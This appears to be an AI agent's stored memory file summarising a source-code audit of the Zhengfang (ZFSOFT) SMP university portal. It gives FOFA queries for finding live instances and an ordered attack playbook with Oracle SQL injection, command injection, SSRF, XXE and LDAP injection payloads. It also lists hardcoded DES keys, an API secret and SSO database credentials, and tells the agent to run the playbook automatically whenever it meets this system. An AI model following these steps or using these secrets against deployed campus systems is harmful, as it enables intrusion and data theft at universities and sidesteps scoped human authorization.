---
name: kb_zhengfang_portal_code_audit
description: 正方教务/门户系统(SMP)源码审计结果—SQL注入/命令注入/硬编码密钥/XXE/SSRF/eWebEditor上传/LDAP注入/越权，遇正方系统自动按playbook测试
metadata: 
  node_type: memory
  type: reference
  source: D:/Desktop/正方教务系统源码 代码审计
  date: 2026-06-14
  related_files: 
    - <workdir>/tools/zhengfang_audit/zf_portal_sqli_report.md
    - <workdir>/tools/zhengfang_audit/zf_portal_full_audit.md
    - <workdir>/tools/zhengfang_audit/zf_portal_pentest_playbook.md
  related_memories: 
    - edu_src_jiaowu
    - kb_src_sqli_practical_workflow_2026
    - kb_src_burp_centered_workflow_2026
  originSessionId: 0c92aa56-5b1f-40bb-8106-52d304580af9
---

# 正方教务系统 (ZFSOFT SMP Portal) 源码审计

## 系统指纹

- 版本: Portal SMP 4.4.4, 技术栈: Struts 1.x + Spring + DWR 2.0.6 + Axis + Oracle
- 反编译代码: `<workdir>/zhengfang_decompiled/`

## 识别方法

- FOFA: `app="正方软件-教务系统"` / `body="zfportal"` / `body="正方软件"`
- 路径: `/dwr/interface/statAjax.js` / `/portal.do` / `/zfsmp` / `/ewebeditor/jsp/upload.jsp`
- Cookie: `zfportal_JSESSIONID`
- HTML特征: `portlet_` / `xtkjdm` 属性

## 遇到正方系统时的默认测试流程

### 第一步: SQL 注入 (最高优先级)

**P0 — StatAjax DWR**:
1. 访问 `/dwr/index.html` 确认 DWR 可用
2. 查看 `/dwr/interface/statAjax.js` 获取方法签名
3. 用 `getWzStatByDateAndWzdm` 测试 `dwdm/wzdm/lmdm` 参数
   - Payload: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)||'`
4. 用 `getWzStatByDate` 测试 `from/to` 参数
5. 用 `getWzStat` 测试 `linage` 参数

**P0 — 其他 DWR 接口**:
1. 通过 `/dwr/index.html` 列出所有暴露的 Ajax 类
2. 每个类的每个字符串参数都测试单引号+Oracle报错注入

**P0 — 分页排序注入**:
1. 所有列表接口测试 `order[0][column]` / `order[0][dir]` 等 Spring Data JPA 排序参数
2. 所有列表接口的 `sort` / `order` / `pageSize` 参数

### 第二步: 命令注入

1. 寻找"获取客户端MAC地址"或类似功能
2. Payload: `127.0.0.1 & whoami` / `127.0.0.1 | dir`

### 第三步: 文件上传/SSRF

1. 探测 eWebEditor: `/ewebeditor/jsp/upload.jsp`
2. 远程抓取 SSRF: `action=remote` + `eWebEditor_UploadText` 含内网 URL
3. 文件上传绕过: 尝试 `..\` 绕过路径检查

### 第四步: XXE

1. 所有 XML 输入点 (WebService/RSS/Ajax XML 响应)
2. OOB payload: `<!ENTITY % xxe SYSTEM "http://collaborator/">`

### 第五步: LDAP 注入

1. CAS/SSO 统一认证登录口
2. Payload: `uid = admin)(|(uid=*)` ; `userType = People)(|(objectclass=*)`

### 第六步: 越权/配置泄露

1. `/WEB-INF/properties/dataSource.properties`
2. `/WEB-INF/zfssoconfig.properties`
3. `/portal.do?theAction=setup&id=` 遍历 ID

## 已知硬编码密钥 (用于密码解密)

- DES Key: `7EV/Zzutjzg=` (Base64) → `Key.java`
- DB 加密密码: `HpgwK09U9WqVbIyfBAUhPA==` (DES ECB)
- RSA 私钥: `MailNetsSupport.java:22` (2048-bit DER)
- API Secret: `35c51afdb3caa33d1e9b36802c5d79b8` (亿邮)
- SSO DB: `zftest_cll / setf?)]S+t`

## Oracle 注入速查

| 类型 | Payload |
|------|---------|
| 报错 | `'||TO_CHAR(1/0)||'` |
| 报错 | `'||(SELECT UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)||'` |
| 布尔 | `'||(SELECT CASE WHEN (ASCII(SUBSTR(USER,1,1))>77) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)||'` |
| 延时 | `'||(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE '0' END FROM dual)||'` |
| OOB | `'||(SELECT UTL_HTTP.REQUEST('http://collaborator/') FROM dual)||'` |

## 关键文件路径 (完整审计报告)

- SQL注入详解: `<workdir>/tools/zhengfang_audit/zf_portal_sqli_report.md`
- 全部漏洞: `<workdir>/tools/zhengfang_audit/zf_portal_full_audit.md`
- 测试手册: `<workdir>/tools/zhengfang_audit/zf_portal_pentest_playbook.md`

**Why:** 正方教务/门户系统在高校中广泛部署，源码审计发现的漏洞可在已授权测试中直接利用，大幅提升测试效率和深度。
**How to apply:** 遇到正方系统时，按本文件中的测试流程从P0到P6依次执行，无需再从零开始探测。优先打 DWR StatAjax SQL 注入，这是最高成功率的入口。
